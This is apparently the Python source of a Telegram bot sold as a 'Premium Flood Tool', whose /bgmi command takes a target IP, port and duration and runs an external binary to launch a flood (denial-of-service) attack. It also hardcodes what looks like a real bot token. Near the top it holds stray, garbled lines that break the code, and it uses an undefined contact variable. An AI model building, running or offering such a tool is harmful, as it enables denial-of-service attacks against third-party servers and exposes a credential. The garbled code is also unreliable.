import os
import subprocess
from telegram import Update, BotCommand
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import random

# Bot Admin Contact
Aothon-telegram-bot 
pip install telebot flask aiogramaliaYtOwner"

# Start Command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    welcome_messages = [
        "🎉 *Welcome to Premium Flood Tool Bot*! 🎉",
        "🔥 *Unleash the power with Flood Tool Bot!* 🔥",
        "💎 *Premium Flood Tool, at your service!* 💎"
    ]
    await update.message.reply_text(
        random.choice(welcome_messages) + "\n\n"
        "✨ Use `/help` to explore the commands.\n"
        "⚠️ *Warning*: Unauthorized misuse is prohibited.",
        parse_mode="Markdown"
    )

# Help Command
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "📘 *Help Menu*\n\n"
        "Here are the available commands:\n"
        "✅ `/start` - Start the bot\n"
        "✅ `/help` - Show help menu\n"
        "✅ `/bgmi <IP> <PORT> <DURATION>` - Launch a flood attack\n"
        "✅ `/status` - Show system resource usage\n"
        "✅ `/admin` - Contact the admin\n"
        "✅ `/features` - Explore premium features\n\n"
        f"🛠 For support, contact: {ADMIN_CONTACT}",
        parse_mode="Markdown"
    )

# BGMI Command
async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if len(context.args) != 3:
        await update.message.reply_text(
            "❌ Usage: `/bgmi <IP> <PORT> <DURATION>`\n\n"
            "Example: `/bgmi 192.168.1.1 80 10`",
            parse_mode="Markdown"
        )
        return

    ip, port, duration = context.args

    if not validate_ip(ip):
        await update.message.reply_text("❌ Invalid IP address.")
        return

    if not port.isdigit() or not (1 <= int(port) <= 65535):
        await update.message.reply_text("❌ Invalid port number.")
        return

    if not duration.isdigit() or int(duration) <= 0:
        await update.message.reply_text("❌ Invalid duration.")
        return

    executable = "./kalia"
    if not os.path.isfile(executable):
        await update.message.reply_text(
            "❌ `flood_tool` binary not found. Compile it and place it in the bot's directory.",
            parse_mode="Markdown"
        )
        return

    await update.message.reply_text(
        f"🚀 *Starting Flood Attack*\n\n"
        f"📍 Target: `{ip}`\n"
        f"🔗 Port: `{port}`\n"
        f"⏳ Duration: `{duration}` seconds\n",
        parse_mode="Markdown"
    )

    try:
        result = subprocess.run(
            [executable, ip, port, duration],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        if result.returncode == 0:
            await update.message.reply_text(f"✅ Attack finished:\n\n```\n{result.stdout}\n```", parse_mode="Markdown")
        else:
            await update.message.reply_text(f"❌ Error:\n\n```\n{result.stderr}\n```", parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"❌ Error running the tool: `{e}`", parse_mode="Markdown")

# Status Command
async def status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        import psutil
        cpu = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        total_memory = round(memory.total / (1024 ** 3), 2)
        used_memory = round(memory.used / (1024 ** 3), 2)
        await update.message.reply_text(
            f"📊 *System Status*\n\n"
            f"💻 CPU Usage: {cpu}%\n"
            f"🧠 Memory: {used_memory} GB / {total_memory} GB",
            parse_mode="Markdown"
        )
    except ImportError:
        await update.message.reply_text("❌ `psutil` module not installed. Install it with `pip install psutil`.")

# Admin Command
async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        f"📞 *Contact Admin*: {ADMIN_CONTACT}\n\n"
        "Feel free to reach out for support or inquiries.",
        parse_mode="Markdown"
    )

# Features Command
async def features(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "💎 *Premium Features*\n\n"
        "🔹 Dynamic interaction with C binaries\n"
        "🔹 Enhanced validation and error handling\n"
        "🔹 System resource monitoring\n"
        "🔹 Contact admin support\n"
        "🔹 Premium UI with emojis and markdown",
        parse_mode="Markdown"
    )

# IP Validation Helper
def validate_ip(ip):
    import re
    pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    if not pattern.match(ip):
        return False
    parts = ip.split(".")
    return all(0 <= int(part) <= 255 for part in parts)

# Main Function
def main():
    BOT_TOKEN = "7799579745:AAEBe-b42-FYeqegBVQs7KYJ8celqUUowvI"

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    # Commands
    app.bot.set_my_commands([
        BotCommand("start", "Start the bot"),
        BotCommand("help", "Show help menu"),
        BotCommand("bgmi", "Launch a flood attack"),
        BotCommand("status", "Show system resource usage"),
        BotCommand("admin", "Contact the admin"),
        BotCommand("features", "Explore premium features"),
    ])

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("bgmi", bgmi))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("admin", admin))
    app.add_handler(CommandHandler("features", features))

    print("🚀 Premium Flood Tool Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()